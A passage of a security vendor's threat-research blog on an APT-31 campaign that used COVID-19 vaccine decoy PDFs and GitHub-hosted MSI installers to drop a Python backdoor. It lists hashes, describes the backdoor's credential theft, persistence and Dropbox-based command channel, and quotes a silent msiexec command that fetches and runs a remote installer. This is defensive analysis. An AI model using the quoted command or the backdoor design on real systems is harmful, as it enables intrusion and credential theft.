describe in the later sections of the blog, is related to themes of interest for the targeted victims.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eThreat attribution\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eWe correlated all the instances of attacks described in this blog to the same threat actor based on the following indicators.\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003eThe attack flow is similar in all cases.\u003c/li\u003e\r\n\t\u003cli\u003eThe use of legitimate attacker-controlled GitHub accounts to host malicious MSI files with spoofed file extensions.\u003c/li\u003e\r\n\t\u003cli\u003eThe use of Dropbox API for command-and-control (C\u0026amp;C) communication.\u003c/li\u003e\r\n\t\u003cli\u003eThe MSI wrapper used to convert the EXE to MSI file format.\u003c/li\u003e\r\n\t\u003cli\u003ePyInstaller used to compile the Python script to the final payload.\u003c/li\u003e\r\n\t\u003cli\u003eDecompiled Python script using the same AES encryption key and sharing of code base.\u003c/li\u003e\r\n\t\u003cli\u003eThe name of artifacts such as Windows Run registry key used to create persistence on the machine.\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eIn October 2020, Google’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report \u003ca href=\"https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats\"\u003ehere\u003c/a\u003e. While Google’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them. All the indicators mentioned above were shared by the samples in our report.\u003c/p\u003e\r\n\r\n\u003cp\u003eUpon further research, we discovered a \u003ca href=\"https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/\"\u003ereport\u003c/a\u003e of an attack using Hong Kong pro-democracy protest themes in October 2019. There is considerable overlap between the malware distribution strategy and the payload indicators in this report and the samples we discovered.\u003c/p\u003e\r\n\r\n\u003cp\u003eTherefore, we can confidently attribute the attack discussed in this blog to APT-31.\u003cbr\u003e\r\n \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eDecoy contents\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eIn this section, we share details of the decoy documents that were displayed to the user as a social engineering technique as the malicious payload executed in the background.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eMD5 hash of MSI file\u003c/strong\u003e: 077ebc3535b38742307ef1c9e3f95222\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eDecoy Filename\u003c/strong\u003e: PAPER-COVID-19-Vaccine-Strategy.pdf\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 2 shows the contents of this decoy document, which discusses a COVID-19 vaccine strategy specifically for New Zealand government authorities. Threat actors obtained the original source of this document \u003ca href=\"https://covid19.govt.nz/\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"decoy_1x\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_1x.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 2: Decoy document related to the New Zealand government's COVID-19 vaccine strategy\u003c/em\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eMD5 hash of MSI file:\u003c/strong\u003e f3896d4a29b4a2ea14ea8a7e2e500ee5\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eDecoy Filename\u003c/strong\u003e: covid_19_vaccines_final.pdf\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 3 shows the contents of this document, which describes various initiatives related to COVID-19 vaccines. It pretends to be from the “Treatment Action Group.”\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"Decoy_2\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_2.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 3: Contents of the decoy document (from \"Treatment Action Group\").\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eMD5 hash of MSI file:\u003c/strong\u003e b4112b0700be2343422c759f5dc7bb8b\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eDecoy Filename\u003c/strong\u003e: FINAL__-COVID-Vaccine-Letter.pdf\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 4 shows the contents of a document that pretends to be from the National Indian Health Board and discusses the COVID-19 vaccine distribution with a focus on pandemic relief packages.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"Decoy_3\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_3.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 4: Contents of vaccine distribution document which pretends to be from the National Indian Health Board.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eMD5 hash of MSI file:\u003c/strong\u003e daa7045a5c607fc2ae6fe0804d493cea\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eDecoy filename\u003c/strong\u003e: 200709-The-Publics-Role-in-COVID-19-Vaccination.pdf\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 5 shows the contents of a document that pretends to be from a working group involving John Hopkins Bloomberg School of Public Health and Texas State Anthropology discussing the public’s role in the COVID-19 vaccination.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"Decoy_4\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/decoy_4.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 5: Decoy document related to the public's role in a COVID-19 vaccination\u003c/em\u003e\u003cbr\u003e\r\n \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eTechnical analysis\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eSince there are multiple stages involved in the infection chain, we will describe each component in detail in this section.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eMSI file\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eFor the purpose of technical analysis, we will consider the MSI file with MD5 hash: \u003cstrong\u003ef3896d4a29b4a2ea14ea8a7e2e500ee5\u003c/strong\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003eMSI is an installer package file format used by Microsoft Windows. Microsoft Windows provides an \u003cem\u003emsiexec\u003c/em\u003e utility that provides the means to install, modify, and perform operations on MSI files.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF. Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the \u003ca href=\"https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/\"\u003ereport\u003c/a\u003e, we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility.\u003c/p\u003e\r\n\r\n\u003cp\u003eIn this threat actor's 2019 activity, an LNK file was used to fetch the MSI binary from GitHub and execute it using the following command line:\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eC:\\Windows\\System32\\msiexec.exe  /q /i \u003cgithub_url\u003e\u003c/github_url\u003e\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003eIt is worth noting that in 2019, this actor used a fake file extension (*.png) for the MSI binary hosted on the attacker-controlled GitHub account.\u003c/p\u003e\r\n\r\n\u003cp\u003eBased on this similarity, we are confident that a first-stage payload was involved that downloads and executes the MSI files.\u003c/p\u003e\r\n\r\n\u003cp\u003eAll the MSI files were created using \u003ca href=\"https://www.exemsi.com\"\u003eMSI Wrapper\u003c/a\u003e software, which helps to convert an executable file to an MSI file. With an MSI Wrapper, you can include other files in the same MSI package and execute them along with the main executable.\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 6 shows the MSI Wrapper flash screen displayed to the user upon execution.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"MSI_Wrapper\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/MSI_wrapper.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 6: MSI Wrapper flash screen displayed to the user.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003cp\u003eUpon execution, the MSI binary drops and executes the main payload, which is a python-compiled binary and also opens the dropped decoy PDF file which is displayed to the user.\u003cbr\u003e\r\n \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003ePython-compiled binary\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe MSI file described above will drop a Python-compiled binary in the Appdata\\Roaming directory, which is used to perform further malicious activities.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eMD5 hash\u003c/strong\u003e: bd26122b29ece6ce5abafb593ff7b096\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003eFilename\u003c/strong\u003e: OneDrive.exe\u003c/p\u003e\r\n\r\n\u003cp\u003eFor the purpose of social engineering, the threat actor chose file names related to legitimate online services, including Microsoft OneDrive. In a few instances, we observed the use of file names resembling McAfee’s endpoint security product. Even the file icons for these binaries are selected to masquerade as the corresponding legitimate applications. \u003c/p\u003e\r\n\r\n\u003cp\u003eSince this binary used the PyInstaller packager to compile the Python script to a standalone executable, we can extract the compiled Python script (*.pyc) from this package and use a decompiling tool such as uncomplye6 to decompile its contents.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe complete decompiled script is included in Appendix I.\u003c/p\u003e\r\n\r\n\u003cp\u003eBelow are some of the key functionalities of the binary.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003e1. Check and use the proxy configuration: \u003c/strong\u003eCheck if the proxy is configured using registry value “ProxyEnable” which is located under registry key “Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings”. If successful then the proxy server information is obtained using the registry value “ProxyServer” under the same registry key. Later this proxy server is used for all the C\u0026amp;C communication.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003e2. Browser credential stealing\u003c/strong\u003e: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and Google Chrome browser.\u003cbr\u003e\r\n\u003cbr\u003e\r\nFigures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"ie_credentials\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/ie_credentials.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 7: Code section used to steal MSIE credentials.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"chrome_credentials\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/chrome_credentials.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 8: Code section used to steal Chrome browser credentials.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cstrong\u003e3. Persistence\u003c/strong\u003e: Creates a Windows RUN registry key for persistence. The name of the key is: \"Dropbox Update Setup\". This name was consistent in all the samples. This key points to the location of the Python-compiled binary in the %appdata% directory to ensure that it is started automatically each time the system is rebooted.\u003c/p\u003e\r\n\r\n\u003cp\u003e4. \u003cstrong\u003eBot identifier generation\u003c/strong\u003e: Generates a unique ID (uuid) for the machine, which is used to register the bot with the attacker's C\u0026amp;C server.\u003c/p\u003e\r\n\r\n\u003cp\u003euniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))\u003c/p\u003e\r\n\r\n\u003cp\u003e5. \u003cstrong\u003eRegistration of bot\u003c/strong\u003e: Collects the following information from the machine to register the bot with the C\u0026amp;C server.\u003c/p\u003e\r\n\r\n\u003cp\u003eSystem information - Details of processor architecture.\u003c/p\u003e\r\n\r\n\u003cp\u003eCurrent timestamp - Format: %Y-%m-%d %H:%M:%S\u003c/p\u003e\r\n\r\n\u003cp\u003eSystem name\u003c/p\u003e\r\n\r\n\u003cp\u003eUsername of the machine\u003c/p\u003e\r\n\r\n\u003cp\u003eCollects this information in JSON format, AES encrypts it and sends it to the attacker's server using Dropbox API.\u003c/p\u003e\r\n\r\n\u003cp\u003e6. \u003cstrong\u003eCommand-and-control activities\u003c/strong\u003e: After registering the bot with attacker's server, it will check for new jobs by querying the Dropbox API endpoint: https://api.dropboxapi.com/2/files/job\u003c/p\u003e\r\n\r\n\u003cp\u003eThere are three main commands supported in the script:\u003c/p\u003e\r\n\r\n\u003cp\u003ea) upload\u003c/p\u003e\r\n\r\n\u003cp\u003eb) download\u003c/p\u003e\r\n\r\n\u003cp\u003ec) cmd: A system command which needs to be executed on the endpoint. Python script will execute this using subprocess.Popen()\u003c/p\u003e\r\n\r\n\u003cp\u003eThe results will be stored in a JSON format, AES-encrypted and sent as an attachment using the Dropbox API.\u003c/p\u003e\r\n\r\n\u003cp\u003eJSON format: {u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'file': self.attachment, u'msg': self.text}\u003c/p\u003e\r\n\r\n\u003cp\u003eHere, text indicates the output of the command executed on the endpoint.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe filename format used is: back#\u003cunique_id\u003e#\u003cjob_id\u003e#.txt\u003c/job_id\u003e\u003c/unique_id\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eZscaler Cloud Sandbox detection\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eFigure 9 shows the sandbox detection for the final payload which is a Python-compiled binary.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"sandbox_detection\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/sandbox_detection.png\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 9: Zscaler Cloud Sandbox detection.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eConclusion\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines. By abusing legitimate services such as GitHub, Google Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions.\u003c/p\u003e\r\n\r\n\u003cp\u003eAs always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine. \u003c/p\u003e\r\n\r\n\u003cp\u003eThe Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eMITRE ATT\u0026amp;CK
